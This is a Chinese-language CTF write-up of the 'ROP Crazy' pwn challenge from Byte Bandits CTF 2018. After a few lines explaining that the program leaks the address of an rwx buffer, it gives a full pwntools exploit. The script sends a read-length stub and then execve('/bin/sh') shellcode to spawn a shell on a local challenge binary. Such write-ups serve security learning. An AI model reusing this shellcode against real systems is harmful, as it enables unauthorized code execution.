---
layout:		post
title:		Byte Bandits CTF 2018部分writeup
author:		wooy0ung
tags:		pwn
category: 	writeup
---


>[索引目录]  
>0x001 ROP Crazy  
<!-- more -->


## 0x001 ROP Crazy

程序开辟了0x1000的rwx内存空间，并将
![](/assets/img/writeup/2018-04-10-bytebanditsctf-2018-writeup/0x001-001.png)

首地址被打印出来了
![](/assets/img/writeup/2018-04-10-bytebanditsctf-2018-writeup/0x001-002.png)

再读8 byte，明显不够放入shellcode，做rop修改读入长度为0xff byte
![](/assets/img/writeup/2018-04-10-bytebanditsctf-2018-writeup/0x001-003.png)

exp.py
```
from pwn import *

context.arch = "amd64"

s = process("./gg")
elf = ELF("./gg")

sh_addr = int(s.recvline(),16)

s.recv(0x1000)

s.send(p64(sh_addr))

p = asm("""
xor rdx,rdx
mov dl,0xff
syscall
nop
""")

s.send(p)

p = "\x90"*0xc8
p += asm("""
xor rdx,rdx
mov dl,0xff
syscall
nop
mov rbx,0x0068732f6e69622f
push rbx
push rsp
pop rdi
xor rsi,rsi
push rsi
pop rdx
push rdx
pop rax
mov al,0x3b
syscall
mov al,0x3c
xor rdi,rdi
syscall
""")

s.send(p)
s.interactive()
```